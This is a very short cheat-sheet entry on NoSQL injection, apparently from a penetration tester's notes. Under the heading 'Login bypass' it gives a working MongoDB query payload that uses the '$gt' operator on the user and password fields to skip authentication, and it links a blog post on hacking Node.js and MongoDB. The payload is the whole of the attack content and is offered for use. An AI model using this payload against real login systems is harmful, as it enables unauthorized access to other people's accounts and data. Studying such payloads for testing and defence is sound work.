# Nosql-injections


## Login bypass

Basically change the query to this.

```
{"user":{"$gt": ""},"pass":{"$gt": ""}}
```


http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html

